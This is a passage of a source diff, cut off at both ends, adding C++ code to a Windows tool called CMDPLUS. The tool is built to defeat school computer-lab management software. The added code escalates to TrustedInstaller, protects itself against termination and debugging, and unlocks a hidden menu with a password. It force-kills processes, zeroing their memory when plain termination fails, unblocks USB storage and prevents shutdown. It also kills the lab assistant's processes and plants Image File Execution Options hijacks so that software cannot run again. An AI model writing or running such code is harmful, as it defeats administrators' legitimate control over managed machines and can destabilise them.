+                CLIENT_ID clientId = { 0 };
+                OBJECT_ATTRIBUTES objAttr = { 0 };
+                clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+                objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+                NTSTATUS status = ProcessTerminator::NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+                if (NT_SUCCESS(status) && hProcess) {
+                    openedHandles.push_back(hProcess);
+                }
+            }
+
+            if (openedHandles.empty()) {
+                std::wcerr << L"无法打开 PID " << pid << std::endl;
+                return false;
+            }
+
+            for (HANDLE hProc : openedHandles) {
+                if (ProcessTerminator::NtTerminateProcess) {
+                    NTSTATUS status = ProcessTerminator::NtTerminateProcess(hProc, 1);
+                    if (NT_SUCCESS(status)) {
+                        terminated = true;
+                        break;
+                    }
+                }
+                if (TerminateProcess(hProc, 1)) {
+                    terminated = true;
+                    break;
+                }
+            }
+
+            if (!terminated) {
+                for (HANDLE hProc : openedHandles) {
+                    MEMORY_BASIC_INFORMATION mbi;
+                    LPVOID address = 0;
+
+                    while (VirtualQueryEx(hProc, address, &mbi, sizeof(mbi))) {
+                        if (mbi.State == MEM_COMMIT &&
+                            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) {
+                            std::vector<BYTE> zeros(mbi.RegionSize, 0);
+                            SIZE_T bytesWritten;
+                            WriteProcessMemory(hProc, mbi.BaseAddress, zeros.data(), mbi.RegionSize, &bytesWritten);
+                        }
+                        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
+                    }
+                }
+
+                for (HANDLE hProc : openedHandles) {
+                    if (ProcessTerminator::NtTerminateProcess) {
+                        NTSTATUS status = ProcessTerminator::NtTerminateProcess(hProc, 1);
+                        if (NT_SUCCESS(status)) {
+                            terminated = true;
+                            break;
+                        }
+                    }
+                    if (TerminateProcess(hProc, 1)) {
+                        terminated = true;
+                        break;
+                    }
+                }
+            }
+
+            if (!terminated) {
+                HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+                if (hNtdll) {
+                    typedef NTSTATUS(NTAPI* _ZwTerminateProcess)(HANDLE, NTSTATUS);
+                    _ZwTerminateProcess ZwTerminateProcess = (_ZwTerminateProcess)GetProcAddress(hNtdll, "ZwTerminateProcess");
+                    if (ZwTerminateProcess) {
+                        for (HANDLE hProc : openedHandles) {
+                            NTSTATUS status = ZwTerminateProcess(hProc, 1);
+                            if (NT_SUCCESS(status)) {
+                                terminated = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            for (HANDLE hProc : openedHandles) {
+                if (hProc && hProc != INVALID_HANDLE_VALUE) {
+                    CloseHandle(hProc);
+                }
+            }
+
+            if (terminated) {
+                std::wcout << L"PID " << pid << L" 已终止" << std::endl;
+            }
+            else {
+                std::wcerr << L"PID " << pid << L" 终止失败" << std::endl;
+            }
+
+            return terminated;
+        }));
+    }
+
+    int successCount = 0;
+    int failCount = 0;
+
+    for (auto& future : futures) {
+        if (future.get()) {
+            successCount++;
+        }
+        else {
+            failCount++;
+        }
+    }
+
+    std::wcout << L"批量处理完成: 成功 " << successCount << L", 失败 " << failCount << std::endl;
+}
+
+static bool IsProcessRunning(const std::wstring& processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+    bool found = false;
+
+    if (Process32FirstW(hSnapshot, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, processName.c_str()) == 0) {
+                found = true;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe));
+    }
+
+    CloseHandle(hSnapshot);
+    return found;
+}
+
+static bool CheckZmservAndWarn() {
+    if (IsProcessRunning(L"zmserv.exe")) {
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"  [警告] 检测到 zmserv.exe 正在运行!" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+        std::wcout << L"\n  zmserv.exe 是学生机房管理助手的服务程序。" << std::endl;
+        std::wcout << L"  执行此功能前需要先终止该进程。" << std::endl;
+        std::wcout << L"\n  请先运行 功能8(删除学生机房管理助手) 或 功能14(肃清系统) 终止 zmserv.exe" << std::endl;
+        std::wcout << L"  然后再执行此功能。" << std::endl;
+        Sleep(2000);
+        return false;
+    }
+    return true;
+}
+
+static int MainEntry(int argc, char* argv[]);
+
+// [功能14] 肃清菜单 — 前向声明 (实现在功能14代码段)
+static void Feature14Menu();
+static void AutoCleanupAndExit();
+
+int main(int argc, char* argv[]) {
+    // ============================================================
+    // [修复] 移除SEH自动重启功能
+    // 原因：SEH自动重启与Watchdog守护机制冲突，会导致多进程爆炸
+    // 现在只显示错误信息，由Watchdog负责进程复活
+    // ============================================================
+    __try {
+        return MainEntry(argc, argv);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        DWORD exceptionCode = GetExceptionCode();
+
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"       [致命错误] 程序发生崩溃!" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+        std::wcout << L"  异常代码: 0x" << std::hex << exceptionCode << std::dec << std::endl;
+
+        switch (exceptionCode) {
+        case EXCEPTION_ACCESS_VIOLATION:
+            std::wcout << L"  错误类型: 访问违规 (空指针/内存越界)" << std::endl;
+            break;
+        case EXCEPTION_STACK_OVERFLOW:
+            std::wcout << L"  错误类型: 栈溢出" << std::endl;
+            break;
+        case EXCEPTION_INT_DIVIDE_BY_ZERO:
+            std::wcout << L"  错误类型: 除零错误" << std::endl;
+            break;
+        case EXCEPTION_BREAKPOINT:
+            std::wcout << L"  错误类型: 断点中断 (可能被调试)" << std::endl;
+            break;
+        case EXCEPTION_ILLEGAL_INSTRUCTION:
+            std::wcout << L"  错误类型: 非法指令" << std::endl;
+            break;
+        case EXCEPTION_PRIV_INSTRUCTION:
+            std::wcout << L"  错误类型: 权限不足指令" << std::endl;
+            break;
+        case EXCEPTION_DATATYPE_MISALIGNMENT:
+            std::wcout << L"  错误类型: 数据对齐错误" << std::endl;
+            break;
+        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:
+            std::wcout << L"  错误类型: 数组越界" << std::endl;
+            break;
+        default:
+            std::wcout << L"  错误类型: 未知异常" << std::endl;
+            break;
+        }
+
+        std::wcout << L"\n  [注意] Watchdog守护进程将自动重启程序..." << std::endl;
+        Sleep(2000);
+
+        // 不再自动创建新实例，避免与Watchdog冲突
+        // 直接退出，让Watchdog负责重启
+        return exceptionCode;
+    }
+}
+
+static int MainEntry(int argc, char* argv[]) {
+    // ============================================================
+    // [DMSP v5.0] 最早时刻执行安全验证 - 缩小竞态窗口
+    // 在所有其他初始化（单例锁、提权、权限等）之前验证签名和完整性
+    // ============================================================
+    DMSP_EARLY_VERIFY();
+
+    // ============================================================
+    // [修复] 单例互斥锁 - 防止多进程爆炸
+    // 原因：SEH自动重启 + Watchdog守护 + RunAsTrustedInstaller
+    //       三者冲突会导致指数级创建新进程
+    // ============================================================
+    const wchar_t* MUTEX_NAME = L"Global\\CMDPLUS_SINGLETON_INSTANCE";
+    HANDLE hSingletonMutex = NULL;
+    bool isTiChild = false;
+
+    // 检查是否为TI子进程（通过命令行参数 --ti-child）
+    for (int i = 1; i < argc; i++) {
+        if (_stricmp(argv[i], "--ti-child") == 0) {
+            isTiChild = true;
+            break;
+        }
+    }
+
+    // [功能14] 开机自启肃清模式 --autoclean
+    for (int i = 1; i < argc; i++) {
+        if (_stricmp(argv[i], "--autoclean") == 0) {
+            // 提升为管理员权限后执行肃清并退出
+            // 无需单例检查, 独立运行
+            DMSP::InitializeState();
+            AutoCleanupAndExit();
+            return 0;
+        }
+    }
+
+    if (!isTiChild) {
+        // 非TI子进程：检查单例互斥锁
+        hSingletonMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            // 互斥锁已存在，说明已有实例在运行
+            if (hSingletonMutex) CloseHandle(hSingletonMutex);
+            return 0;  // 静默退出，不创建新实例
+        }
+    }
+    // TI子进程跳过单例检查，允许运行
+
+    // ============================================================
+    // [PPL] 策略调整: 不在提权前尝试PPL
+    // 原因: 1)管理员权限不足以设置PPL(需要TI/SeTcb)
+    //       2)WinVerifyTrust在TI子进程可能卡住
+    //       3)提权前调用会"污染"进程，导致即使提权后也无法设置
+    //
+    // 新策略: 仅在确认以TrustedInstaller运行后才尝试PPL
+    // ============================================================
+
+    // 设置Unicode输出
+    std::locale::global(std::locale(""));
+    SetConsoleOutputCP(936);
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 0x0F);
+
+    if (DebugPrivilegeEnabler::EnableAllDebugPrivileges()) {
+    }
+    else {
+        std::cerr << "调试权限提升失败" << std::endl;
+        return 1;
+    }
+    ProcessTerminator::enableDebugPrivilege();
+    try {
+        if (!IsRunningAsTrustedInstaller()) {
+            std::wcout << L"正在提升到 TrustedInstaller 权限..." << std::endl;
+            RunAsTrustedInstaller();
+            return 0;
+        }
+        std::wcout << L"当前以TrustedInstaller权限运行" << std::endl;
+
+        // CMDPLUS签名验证 - 使用分散式多层级保护系统
+        DMSP_INIT_CHECK();  // 初始化时深度验证(包含原有功能+增强保护)
+
+        // 初始化增强进程保护钩子
+        InitProcessProtectionHooks();
+        
+        // 启用CMDPLUS自身的反结束进程保护
+        if (EnableProcessProtection(GetCurrentProcess())) {
+            std::wcout << L"[保护] CMDPLUS反结束进程保护已开启" << std::endl;
+        } else {
+            std::wcout << L"[保护] CMDPLUS进程保护启用失败" << std::endl;
+        }
+
+        // 启用增强保护（反挂起、反调试、终结者检测、Watchdog守护）
+        if (EnableEnhancedProtection()) {
+            std::wcout << L"[保护] CMDPLUS增强保护已开启" << std::endl;
+        } else {
+            std::wcout << L"[保护] CMDPLUS增强保护部分功能启用失败" << std::endl;
+        }
+
+        // 提权完成后自动启动Explorer监控
+        StartExplorerMonitor();
+    }
+    catch (const std::exception& e) {
+        std::wcerr << L"错误: " << e.what() << std::endl;
+        std::wcout << L"当前以管理员权限运行" << std::endl;
+        std::wcout << L"[警告] 提权失败，程序将在3秒后退出..." << std::endl;
+        std::wcout << L"  请确保以管理员身份运行，并检查TrustedInstaller服务状态" << std::endl;
+
+        // [修复] 提权失败时不继续运行主循环，直接退出
+        // 原因：如果继续运行会导致原始进程+TI子进程同时存在，造成多进程问题
+        Sleep(3000);
+        return 1;
+    }
+    std::wcout << L"自动解禁功能已开启" << std::endl;
+    std::thread sb(fgj);
+    std::wcout << L"防关机已开启" << std::endl;
+    
+    // [v5.4.2] 启动4.5秒自动验证线程 (独立定时器, 不依赖主循环)
+    StartAutoVerify();
+
+    int i = 10;
+    
+    while (true) {
+        // [v5.4] 周期性运行时安全检查 — 权重自适应调度
+        DMSP_RUNE_CHECK();
+        ShowMainMenu();
+        std::wcout << L"--------==>>";
+        std::string input;
+        std::cin >> input;
+
+        if (input == "zzj") {
+            g_hiddenMenuUnlocked = !g_hiddenMenuUnlocked;
+            if (g_hiddenMenuUnlocked) {
+                std::wcout << L"[隐藏菜单已解锁]" << std::endl;
+            } else {
+                std::wcout << L"[隐藏菜单已锁定]" << std::endl;
+            }
+            continue;
+        }
+
+        int i = 0;
+        try {
+            i = std::stoi(input);
+        } catch (...) {
+            continue;
+        }
+
+        if (i == 13 && !g_hiddenMenuUnlocked) {
+            continue;
+        }
+
+        if (i == 1){
+            DMSP_VERIFY_INT(0x1001);  // 功能1: 结束进程 - 签名验证
+
+            // zmserv.exe检测：如果存在则提示先运行功能8或功能14
+            if (!CheckZmservAndWarn()) {
+                continue;
+            }
+
+            std::wcout << L"正在去除tasklist.exe映像劫持..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tasklist.exe", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                    std::wcout << L"[已清除] tasklist.exe 映像劫持已清除" << std::endl;
+                } else {
+                    std::wcout << L"[信息] tasklist.exe 无映像劫持" << std::endl;
+                }
+            }
+            {
+                HKEY hKey;
+                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tasklist.exe", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                    std::wcout << L"[已清除] tasklist.exe 用户级映像劫持已清除" << std::endl;
+                }
+            }
+            
+            std::wcout << L"正在去除taskkill.exe映像劫持..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                    std::wcout << L"[已清除] taskkill.exe 映像劫持已清除" << std::endl;
+                } else {
+                    std::wcout << L"[信息] taskkill.exe 无映像劫持" << std::endl;
+                }
+            }
+            {
+                HKEY hKey;
+                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                    std::wcout << L"[已清除] taskkill.exe 用户级映像劫持已清除" << std::endl;
+                }
+            }
+            
+            // 使用统一系统进程白名单（转小写以匹配比较）
+            std::set<std::wstring> systemProcesses;
+            for (size_t wi = 0; wi < g_WhitelistCount; wi++) {
+                std::wstring wname = g_UnifiedSystemProcessWhitelist[wi];
+                for (auto& c : wname) c = towlower(c);
+                systemProcesses.insert(wname);
+            }
+            
+            std::wcout << L"\n映像名称                    PID" << std::endl;
+            std::wcout << L"========================= =======" << std::endl;
+            
+            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnapshot != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe;
+                pe.dwSize = sizeof(PROCESSENTRY32W);
+                if (Process32FirstW(hSnapshot, &pe)) {
+                    do {
+                        std::wstring exeName = pe.szExeFile;
+                        for (auto& c : exeName) c = towlower(c);
+                        if (systemProcesses.find(exeName) == systemProcesses.end()) {
+                            std::wcout << std::left << std::setw(25) << pe.szExeFile 
+                                       << std::right << std::setw(6) << pe.th32ProcessID << std::endl;
+                        }
+                    } while (Process32NextW(hSnapshot, &pe));
+                }
+                CloseHandle(hSnapshot);
+            }
+            
+            HandleProcessTermination();
+        }
+        if (i == 2) {
+            DMSP_VERIFY_INT(0x1002);  // 功能2: 打开TI CMD - 签名验证
+            OpenTrustedInstallerCMD();
+        }
+
+        if (i == 3){
+            DMSP_VERIFY_INT(0x1003);  // 功能3: 开启强制置顶 - 签名验证
+            if (!CheckZmservAndWarn()) {
+                break;
+            }
+            if (g_alwaysOnTopEnabled) {
+                std::wcout << L"强制置顶功能已经在运行中" << std::endl;
+            } else {
+                std::wcout << L"强制置顶已启动" << std::endl;
+                StartAlwaysOnTop();
+            }
+        }
+
+        if (i == 4) {
+            DMSP_VERIFY_INT(0x1004);  // 功能4: 取消置顶 - 签名验证
+            StopAlwaysOnTop();
+        }
+        if (i == 5) {
+            DMSP_VERIFY_INT(0x1005);  // 功能5: TI打开程序 - 签名验证
+            OpenAppMenu();
+        }
+        if (i == 6) {
+            DMSP_VERIFY_INT(0x1006);  // 功能6: 强力删除 - 签名验证
+            del();
+        }   
+        if (i == 7) {
+            DMSP_VERIFY_INT(0x1007);  // 功能7: USB解禁 - 签名验证
+            // zmserv.exe检测：如果存在则提示先运行功能8或功能14
+            if (!CheckZmservAndWarn()) {
+                continue;
+            }
+            std::wcout << L"正在执行USB解禁..." << std::endl;
+            bool success = ProcessTerminator::RestoreUSBStorage();
+            if (success) {
+                std::wcout << L"USB解禁成功！" << std::endl;
+            } else {
+                std::wcout << L"USB解禁失败" << std::endl;
+            }
+        }
+        if (i == 8) {
+            DMSP_VERIFY_INT(0x1008);  // 功能8: 删除学生机房管理助手 - 签名验证
+            std::wcout << L"[信息] 开始执行功能8..." << std::endl;
+            
+            {
+                std::wcout << L"[预处理] 正在去除映像劫持..." << std::endl;
+                HKEY hKey;
+                const wchar_t* ifeoPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
+                
+                if (RegOpenKeyW(HKEY_LOCAL_MACHINE, ifeoPath, &hKey) == ERROR_SUCCESS) {
+                    wchar_t subKeyName[256];
+                    DWORD index = 0;
+                    DWORD nameSize = 256;
+                    
+                    while (RegEnumKeyW(hKey, index, subKeyName, nameSize) == ERROR_SUCCESS) {
+                        HKEY hSubKey;
+                        if (RegOpenKeyW(hKey, subKeyName, &hSubKey) == ERROR_SUCCESS) {
+                            wchar_t debuggerVal[MAX_PATH];
+                            DWORD valSize = MAX_PATH * sizeof(wchar_t);
+                            DWORD valType;
+                            
+                            if (RegQueryValueExW(hSubKey, L"Debugger", NULL, &valType, (LPBYTE)debuggerVal, &valSize) == ERROR_SUCCESS) {
+                                std::wstring debugger(debuggerVal);
+                                if (debugger.find(L"CMDPLUS") != std::wstring::npos ||
+                                    debugger.find(L"cmdplus") != std::wstring::npos) {
+                                    RegDeleteValueW(hSubKey, L"Debugger");
+                                    std::wcout << L"  [清除] " << subKeyName << L" 的映像劫持" << std::endl;
+                                }
+                            }
+                            RegCloseKey(hSubKey);
+                        }
+                        index++;
+                        nameSize = 256;
+                    }
+                    RegCloseKey(hKey);
+                }
+                std::wcout << L"[预处理] 映像劫持处理完成" << std::endl;
+            }
+            
+            std::wcout << L"=== 第一阶段：删除学生机房管理助手 ===" << std::endl;
+                std::wcout << L"[检测] 正在扫描学生机房管理助手..." << std::endl;
+
+                std::wstring targetDir;
+                bool foundDir = false;
+                {
+                    WIN32_FIND_DATAW findData;
+                    HANDLE hFind = FindFirstFileW(L"C:\\*", &findData);
+                    if (hFind != INVALID_HANDLE_VALUE) {
+                        do {
+                            std::wstring name = findData.cFileName;
+                            if (name.length() > 1 && (name[0] == L'f' || name[0] == L'F')) {
+                                bool isAllDigits = true;
+                                for (size_t j = 1; j < name.length(); j++) {
+                                    if (!iswdigit(name[j])) { isAllDigits = false; break; }
+                                }
+                                if (isAllDigits) {
+                                    foundDir = true;
+                                    targetDir = L"C:\\" + name;
+                                    std::wcout << L"[发现] " << targetDir << std::endl;
+                                    break;
+                                }
+                            }
+                        } while (FindNextFileW(hFind, &findData));
+                        FindClose(hFind);
+                    }
+                }
+
+                if (!foundDir) {
+                    std::wcout << L"[信息] 未发现学生机房管理助手目录" << std::endl;
+                }
+
+                std::wcout << L"\n[信息] 正在挂起并结束相关进程..." << std::endl;
+                {
+                    struct ProcInfo { DWORD pid; std::wstring name; };
+                    std::vector<ProcInfo> toSuspend;
+                    std::vector<ProcInfo> toTerminate;
+
+                    auto isSystemProcessFast = [](const std::wstring& lowerName,
+                        const std::unordered_set<std::wstring>& whitelistSet,
+                        const std::wstring& currentNameLower) -> bool {
+                        if (whitelistSet.find(lowerName) != whitelistSet.end()) return true;
+                        if (lowerName == currentNameLower) return true;
+                        if (lowerName.find(L"student") != std::wstring::npos) return true;
+                        if (lowerName.find(L"monitor") != std::wstring::npos) return true;
+                        if (lowerName.find(L"mmpc") != std::wstring::npos) return true;
+                        if (lowerName.find(L"main") != std::wstring::npos) return true;
+                        if (lowerName.find(L"spider") != std::wstring::npos) return true;
+                        if (lowerName.find(L"teacher") != std::wstring::npos) return true;
+                        if (lowerName.find(L"easy") != std::wstring::npos) return true;
+                        return false;
+                    };
+
+                    // 使用统一系统进程白名单（转小写以匹配比较）
+                    std::unordered_set<std::wstring> whitelistSet;
+                    for (size_t wi = 0; wi < g_WhitelistCount; wi++) {
+                        std::wstring wname = g_UnifiedSystemProcessWhitelist[wi];
+                        for (auto& c : wname) c = towlower(c);
+                        whitelistSet.insert(wname);
+                    }
+                    // 补充功能1特需的进程
+                    whitelistSet.insert(L"rundll32.exe");
+
+                    wchar_t currentPath[MAX_PATH];
+                    std::wstring currentNameLower;
+                    if (GetModuleFileNameW(nullptr, currentPath, MAX_PATH)) {
+                        currentNameLower = currentPath;
+                        size_t pos = currentNameLower.find_last_of(L"\\/");
+                        if (pos != std::wstring::npos) currentNameLower = currentNameLower.substr(pos + 1);
+                        std::transform(currentNameLower.begin(), currentNameLower.end(), currentNameLower.begin(), ::towlower);
+                    }
+
+                    auto getPIDsByName = [](const std::wstring& processName) -> std::vector<int> {
+                        std::vector<int> pids;
+                        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                        if (hSnapshot == INVALID_HANDLE_VALUE) return pids;
+                        PROCESSENTRY32W pe32;
+                        pe32.dwSize = sizeof(PROCESSENTRY32W);
+                        if (Process32FirstW(hSnapshot, &pe32)) {
+                            do {
+                                if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                                    pids.push_back(pe32.th32ProcessID);
+                                }
+                            } while (Process32NextW(hSnapshot, &pe32));
+                        }
+                        CloseHandle(hSnapshot);
+                        return pids;
+                    };
+
+                    // 收集目标进程
+                    std::vector<std::wstring> targetProcesses = { L"jfglzsn.exe", L"zmserve.exe" };
+                    for (const auto& procName : targetProcesses) {
+                        std::vector<int> pids = getPIDsByName(procName);
+                        for (int pid : pids) {
+                            toTerminate.push_back({ (DWORD)pid, procName });
+                        }
+                    }
+
+                    // 多线程扫描所有进程并分类
+                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                    if (hSnapshot != INVALID_HANDLE_VALUE) {
+                        std::vector<PROCESSENTRY32W> allProcs;
+                        PROCESSENTRY32W pe32;
+                        pe32.dwSize = sizeof(PROCESSENTRY32W);
+                        if (Process32FirstW(hSnapshot, &pe32)) {
+                            do {
+                                allProcs.push_back(pe32);
+                            } while (Process32NextW(hSnapshot, &pe32));
+                        }
+                        CloseHandle(hSnapshot);
+
+                        const size_t threadCount = std::min<size_t>(4, allProcs.size());
+                        std::vector<std::vector<ProcInfo>> threadResults(threadCount);
+                        std::vector<std::thread> threads;
+
+                        size_t chunkSize = allProcs.size() / threadCount;
+                        for (size_t t = 0; t < threadCount; ++t) {
+                            size_t start = t * chunkSize;
+                            size_t end = (t == threadCount - 1) ? allProcs.size() : (t + 1) * chunkSize;
+                            threads.emplace_back([&, start, end, t]() {
+                                for (size_t i = start; i < end; ++i) {
+                                    std::wstring name(allProcs[i].szExeFile);
+                                    std::wstring lowerName = name;
+                                    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
+
+                                    if (isSystemProcessFast(lowerName, whitelistSet, currentNameLower)) continue;
+
+                                    bool isRandomName = (name.length() >= 9 && name.length() <= 13 &&
+                                        name.substr(name.length() - 4) == L".exe");
+                                    if (isRandomName) {
+                                        size_t baseLen = name.length() - 4;
+                                        std::wstring baseName = name.substr(0, baseLen);
+                                        bool hasDigit = false, hasLetter = false, allValid = true;
+                                        for (wchar_t c : baseName) {
+                                            if (iswdigit(c)) hasDigit = true;
+                                            else if (iswalpha(c)) hasLetter = true;
+                                            else { allValid = false; break; }
+                                        }
+                                        if (allValid && (hasDigit || hasLetter)) {
+                                            threadResults[t].push_back({ allProcs[i].th32ProcessID, name });
+                                        }
+                                    }
+                                }
+                            });
+                        }
+                        for (auto& t : threads) t.join();
+                        for (auto& res : threadResults) {
+                            toTerminate.insert(toTerminate.end(), res.begin(), res.end());
+                        }
+                    }
+
+                    // 阶段1: 挂起所有非白名单进程
+                    std::wcout << L"  [阶段1] 正在挂起 " << toTerminate.size() << L" 个目标进程..." << std::endl;
+                    ProcessTerminator::initNativeAPI();
+                    ProcessTerminator::EnableAllPrivileges();
+                    for (auto& proc : toTerminate) {
+                        HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, proc.pid);
+                        if (hProcess) {
+                            ProcessTerminator::SuspendProcessNative(hProcess);
+                            CloseHandle(hProcess);
+                        }
+                    }
+
+                    // 阶段2: 批量终止所有已挂起的进程
+                    std::wcout << L"  [阶段2] 正在终止所有已挂起进程..." << std::endl;
+                    for (auto& proc : toTerminate) {
+                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, proc.pid);
+                        if (hProcess) {
+                            bool terminated = false;
+                            if (TerminateProcess(hProcess, 0)) terminated = true;
+                            if (!terminated && ProcessTerminator::NtTerminateProcess) {
+                                if (NT_SUCCESS(ProcessTerminator::NtTerminateProcess(hProcess, 0))) terminated = true;
+                            }
+                            CloseHandle(hProcess);
+                            if (terminated) {
+                                std::wcout << L"  [完成] 进程 " << proc.name << L" (PID: " << proc.pid << L") 已终止" << std::endl;
+                            }
+                        }
+                    }
+
+                    std::wcout << L"[完成] 进程挂起与结束操作完成" << std::endl;
+
+                    // 额外检测并结束 jfglzs + 0-4位随机字符的进程
+                    std::wcout << L"\n[信息] 正在检测 jfglzs 随机进程..." << std::endl;
+                    {
+                        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                        if (hSnapshot != INVALID_HANDLE_VALUE) {
+                            PROCESSENTRY32W pe32;
+                            pe32.dwSize = sizeof(PROCESSENTRY32W);
+                            if (Process32FirstW(hSnapshot, &pe32)) {
+                                do {
+                                    std::wstring name(pe32.szExeFile);
+                                    std::wstring lowerName = name;
+                                    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
+
+                                    // 匹配 jfglzs + 0-4位随机字符 + .exe
+                                    bool isJfglzs = false;
+                                    if (lowerName.length() >= 10 && lowerName.length() <= 14) {
+                                        if (lowerName.substr(0, 6) == L"jfglzs" && lowerName.substr(lowerName.length() - 4) == L".exe") {
+                                            size_t randLen = lowerName.length() - 10; // 去掉 jfglzs 和 .exe
+                                            if (randLen <= 4) {
+                                                bool allValid = true;
+                                                for (size_t i = 6; i < 6 + randLen; ++i) {
+                                                    if (!iswalnum(lowerName[i])) { allValid = false; break; }
+                                                }
+                                                if (allValid) isJfglzs = true;
+                                            }
+                                        }
+                                    }
+
+                                    if (isJfglzs) {
+                                        std::wcout << L"  [发现] jfglzs 随机进程 " << name << L" (PID: " << pe32.th32ProcessID << L")" << std::endl;
+                                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+                                        if (hProcess) {
+                                            if (TerminateProcess(hProcess, 0)) {
+                                                std::wcout << L"  [完成] 已终止 " << name << std::endl;
+                                            }
+                                            CloseHandle(hProcess);
+                                        }
+                                    }
+                                } while (Process32NextW(hSnapshot, &pe32));
+                            }
+                            CloseHandle(hSnapshot);
+                        }
+                    }
+
+                    // 阶段3: 为目标目录内所有exe添加映像劫持
+                    if (foundDir && !targetDir.empty()) {
+                        std::wcout << L"\n[信息] 正在为目标目录添加映像劫持..." << std::endl;
+
+                        auto addIFEO = [](const std::wstring& exeName) {
+                            HKEY hKey;
+                            std::wstring ifeoPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + exeName;
+                            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, ifeoPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+                                std::wstring debuggerVal = L"cmd.exe /c exit";
+                                RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)debuggerVal.c_str(), (DWORD)((debuggerVal.length() + 1) * sizeof(wchar_t)));
+                                RegCloseKey(hKey);
+                                return true;
+                            }
+                            return false;
+                        };
+
+                        std::function<void(const std::wstring&, int&)> enumerateExeFiles;
+                        enumerateExeFiles = [&addIFEO, &enumerateExeFiles](const std::wstring& dirPath, int& count) {
+                            std::wstring searchPath = dirPath + L"\\*";
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    std::wstring name = findData.cFileName;
+                                    if (name == L"." || name == L"..") continue;
+                                    std::wstring fullPath = dirPath + L"\\" + name;
+                                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                                        enumerateExeFiles(fullPath, count);
+                                    } else {
+                                        size_t dotPos = name.rfind(L'.');
+                                        if (dotPos != std::wstring::npos) {
+                                            std::wstring ext = name.substr(dotPos);
+                                            std::transform(ext.begin(), ext.end(), ext.begin(), ::towlower);
+                                            if (ext == L".exe") {
+                                                if (addIFEO(name)) {
+                                                    ++count;
+                                                }
+                                            }
+                                        }
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
+                        };
+
+                        int ifeoCount = 0;
+                        enumerateExeFiles(targetDir, ifeoCount);
+                        std::wcout << L"[完成] 已为 " << ifeoCount << L" 个程序添加映像劫持" << std::endl;
+                    }
+                }
+
+                std::wcout << L"\n[信息] 正在删除桌面快捷方式..." << std::endl;
+                {
+                    // 删除所有用户桌面的快捷方式
+                    auto deleteDesktopShortcuts = [](const std::wstring& userPath) {
+                        std::wstring desktopPath = userPath + L"\\Desktop";
+                        std::wstring publicDesktopPath = userPath + L"\\Desktop";
+                        
+                        // 删除快捷方式
